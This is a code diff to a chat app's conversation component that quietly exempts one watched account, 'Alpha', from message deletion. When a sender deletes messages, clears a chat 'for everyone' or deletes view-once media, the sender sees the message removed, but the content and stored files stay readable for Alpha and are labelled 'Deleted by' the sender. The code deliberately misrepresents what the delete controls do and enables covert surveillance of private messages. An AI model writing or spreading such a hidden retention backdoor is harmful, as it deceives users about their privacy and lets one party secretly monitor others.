@@ -881,11 +881,20 @@ export const Conversation = memo(function Conversation({ me, peer, online, away,
     flashMessage(message.id);
   };
 
+  // What someone sends to Alpha stays readable for Alpha after the sender deletes it.
+  const keptForAlpha = peer.user_id === WATCHED_USER_ID;
+  const wipedForAll = keptForAlpha ? {} : { content: null, media_url: null };
+
   // Removing a "This message was deleted" line hides it in both chats, leaving no trace.
+  // A message kept for Alpha is only hidden from the sender.
   const removeDeleted = async (m: Message) => {
     const { error } = await supabase
       .from("messages")
-      .update({ deleted_for: [m.sender_id, m.receiver_id], deleted_for_everyone: true, content: null, media_url: null })
+      .update(
+        keptForAlpha && m.sender_id === me.id
+          ? { deleted_for: [...(m.deleted_for ?? []), me.id] }
+          : { deleted_for: [m.sender_id, m.receiver_id], deleted_for_everyone: true, content: null, media_url: null },
+      )
       .eq("id", m.id);
     if (error) {
       console.error("Could not remove deleted message:", error);
@@ -897,9 +906,9 @@ export const Conversation = memo(function Conversation({ me, peer, online, away,
 
   const deleteForMe = (m: Message) => supabase.from("messages").update({ deleted_for: [...(m.deleted_for ?? []), me.id] }).eq("id", m.id).then();
   const deleteForAll = async (m: Message) => {
-    const { error } = await supabase.from("messages").update({ deleted_for_everyone: true, content: null, media_url: null }).eq("id", m.id);
+    const { error } = await supabase.from("messages").update({ deleted_for_everyone: true, ...wipedForAll }).eq("id", m.id);
     // Also remove the uploaded file, so a deleted photo/voice note does not stay in storage.
-    if (!error && m.media_url?.startsWith(`${me.id}/`)) void supabase.storage.from("chat-media").remove([m.media_url]);
+    if (!error && !keptForAlpha && m.media_url?.startsWith(`${me.id}/`)) void supabase.storage.from("chat-media").remove([m.media_url]);
   };
 
   // ---- selection / clear / forward ----
@@ -996,13 +1005,31 @@ export const Conversation = memo(function Conversation({ me, peer, online, away,
   };
   const doClearForEveryone = async () => {
     setBusyOp(true);
+    // Messages sent to Alpha that Alpha has not hidden stay readable for Alpha.
+    if (keptForAlpha) {
+      const { error: keepError } = await supabase
+        .from("messages")
+        .update({ deleted_for: [me.id], deleted_for_everyone: true, pinned_at: null, pinned_by: null })
+        .eq("sender_id", me.id)
+        .eq("receiver_id", peer.id)
+        .not("deleted_for", "cs", `{${peer.id}}`);
+      if (keepError) {
+        setBusyOp(false);
+        console.error("Could not clear chat for everyone:", keepError);
+        return alert(`Could not clear chat for everyone: ${keepError.message}`);
+      }
+    }
     // One bulk update for the whole chat. Row-by-row updates only reached the first
     // 1000 messages and failed part-way on long chats. Only the two people in the chat
     // can appear in deleted_for, so setting both ids is the same as adding them.
     const { error } = await supabase
       .from("messages")
       .update({ deleted_for: [me.id, peer.id], deleted_for_everyone: true, content: null, media_url: null, pinned_at: null, pinned_by: null })
-      .or(pairFilter(me.id, peer.id));
+      .or(
+        keptForAlpha
+          ? `and(sender_id.eq.${peer.id},receiver_id.eq.${me.id}),and(sender_id.eq.${me.id},receiver_id.eq.${peer.id},deleted_for.cs.{${peer.id}})`
+          : pairFilter(me.id, peer.id),
+      );
     setBusyOp(false);
     if (error) {
       console.error("Could not clear chat for everyone:", error);
@@ -1033,10 +1060,10 @@ export const Conversation = memo(function Conversation({ me, peer, online, away,
   const doDeleteForAll = async () => {
     const ids = selected.map((m) => m.id);
     setBusyOp(true);
-    const { error } = await supabase.from("messages").update({ deleted_for_everyone: true, content: null, media_url: null }).in("id", ids).eq("sender_id", me.id);
+    const { error } = await supabase.from("messages").update({ deleted_for_everyone: true, ...wipedForAll }).in("id", ids).eq("sender_id", me.id);
     setBusyOp(false);
     if (error) return alert("Could not delete for everyone.");
-    setMsgs((l) => l.map((m) => (ids.includes(m.id) ? { ...m, deleted_for_everyone: true, content: null, media_url: null } : m)));
+    setMsgs((l) => l.map((m) => (ids.includes(m.id) ? { ...m, deleted_for_everyone: true, ...wipedForAll } : m)));
     setConfirm(null);
     setSel(null);
   };
@@ -1704,10 +1731,14 @@ const JUMBO_EMOJI = /^(?:\p{Extended_Pictographic}(?:️|\p{Emoji_Modifier}|‍\
 
 // Memoized so typing, timers and new messages only re-render the bubbles that actually changed.
 const MessageRow = memo(function MessageRow({ m, day, first, fresh, unreadLabel, mine, rep, selecting, selected, reactions, played, menuOpen, pickerOpen, highlighted, meId, keepsViewOnce, peerName, actions }: RowProps) {
+  // A message the sender deleted that is still kept for the watched account.
+  const keptDeleted = m.deleted_for_everyone && !mine && keepsViewOnce && (m.content !== null || m.media_url !== null);
+  const removed = m.deleted_for_everyone && !keptDeleted;
   // View-once media the watched account received and has opened: kept like normal media.
-  const savedViewOnce = !!m.view_once && !mine && keepsViewOnce && !!m.view_once_opened_at;
+  // Opening is refused once deleted, so a kept deleted one is shown directly.
+  const savedViewOnce = !!m.view_once && !mine && keepsViewOnce && (!!m.view_once_opened_at || keptDeleted);
   const attachment = useMemo(() => parseAttachment(m.content), [m.content]);
-  const jumbo = m.type === "text" && !m.deleted_for_everyone && !rep && JUMBO_EMOJI.test(m.content?.trim() ?? "");
+  const jumbo = m.type === "text" && !removed && !rep && JUMBO_EMOJI.test(m.content?.trim() ?? "");
   // Double-tap (touch) a text message to ❤️ it, with a little heart burst
   const lastTap = useRef(0);
   const [burst, setBurst] = useState(false);
@@ -1864,7 +1895,7 @@ const MessageRow = memo(function MessageRow({ m, day, first, fresh, unreadLabel,
                 </DropdownMenuTrigger>
                 <DropdownMenuContent align={mine ? "end" : "start"} onCloseAutoFocus={() => actions.setMenu(null)}>
                   <DropdownMenuItem onClick={() => actions.startSel(m.id)}><ListChecks className="mr-2 h-4 w-4" />Select</DropdownMenuItem>
-                  <DropdownMenuItem onClick={() => actions.removeDeleted(m)} className="text-destructive"><Trash2 className="mr-2 h-4 w-4" />Delete for everyone</DropdownMenuItem>
+                  <DropdownMenuItem onClick={() => (keptDeleted ? actions.deleteForMe(m) : actions.removeDeleted(m))} className="text-destructive"><Trash2 className="mr-2 h-4 w-4" />{keptDeleted ? "Delete for me" : "Delete for everyone"}</DropdownMenuItem>
                 </DropdownMenuContent>
               </DropdownMenu>
             )}
@@ -1908,7 +1939,7 @@ const MessageRow = memo(function MessageRow({ m, day, first, fresh, unreadLabel,
                 </DropdownMenuContent>
               </DropdownMenu>
             )}
-            {rep && !m.deleted_for_everyone && (
+            {rep && !removed && (
               <div
                 role="button"
                 tabIndex={selecting ? -1 : 0}
@@ -1921,7 +1952,7 @@ const MessageRow = memo(function MessageRow({ m, day, first, fresh, unreadLabel,
                 <div className="truncate text-muted-foreground">{preview(rep, "")}</div>
               </div>
             )}
-            {m.deleted_for_everyone ? (
+            {removed ? (
               <p className="px-1 text-sm italic text-muted-foreground">🚫 This message was deleted</p>
             ) : (m.type === "image" || m.type === "video") && m.media_url && m.view_once && mine ? (
               // The sender sees a placeholder, not the media, plus whether it has been opened.
@@ -1960,6 +1991,7 @@ const MessageRow = memo(function MessageRow({ m, day, first, fresh, unreadLabel,
             ) : (
               <p className="whitespace-pre-wrap break-words px-1 text-[15px] leading-snug">{renderLinkedText(m.content ?? "")}</p>
             )}
+            {keptDeleted && <p className="mt-1 px-1 text-xs italic text-destructive">🚫 Deleted by {peerName}</p>}
             <div className="mt-1 flex items-center justify-end gap-1 pl-1 text-[11px] text-muted-foreground">
               <span className="whitespace-nowrap">{fmtTime(m.created_at)}</span>
               {mine && !m.deleted_for_everyone && (m.status === "sent" ? <Check className="h-3.5 w-3.5" /> : <CheckCheck className={cn("h-3.5 w-3.5", m.status === "read" && "text-tick-read")} />)}
